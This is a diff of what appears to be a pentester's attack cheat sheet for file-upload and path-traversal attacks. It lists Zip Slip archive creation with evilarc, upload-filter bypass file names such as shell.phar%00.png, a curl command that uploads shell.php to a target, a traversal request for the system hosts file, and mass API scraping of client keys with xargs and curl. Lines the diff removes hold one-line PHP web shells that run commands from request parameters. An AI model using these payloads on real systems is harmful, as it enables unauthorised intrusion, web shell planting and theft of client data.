@@ -466,19 +466,22 @@ cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerU
 cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'
 
 [*] File Upload
-cat dirsearch.txt | jq -r '.results[] | select(.status==200 and (.url | endswith("/"))) | .url' | proxychains httpx -method -x all -sc -mc 200 > httpx_method_all_200
+-->> Zip Slip
+evilarc.py x.php --path 'var/www/html' --depth 6 --os unix --output-file x.zip
 
-curl --upload-file shell.php http://$TARGET:80/upload/
+-->> Bypasses
 shell.PhP
 shell.phar
 shell.P.phpHP
 shell%2EPHP
 shell%2Ephar%00%2Epng
 shell%2Ephar%00.png
-<?php echo passthru($_GET['cmd']); ?>
-<?php echo exec($_POST['cmd']); ?>
-<?php system($_GET['cmd']); ?>
-<?php passthru($_REQUEST['cmd']); ?>
+
+-->> Checking Directory Listings for PUT method
+cat dirsearch.txt | jq -r '.results[] | select(.status==200 and (.url | endswith("/"))) | .url' | httpx -method -x all -sc -mc 200 > httpx_method_all_200
+
+-->> Via Curl
+curl --upload-file shell.php http://$TARGET:80/upload/
 
 [*] Path Traversal
 curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../windows/system32/drivers/etc/hosts'
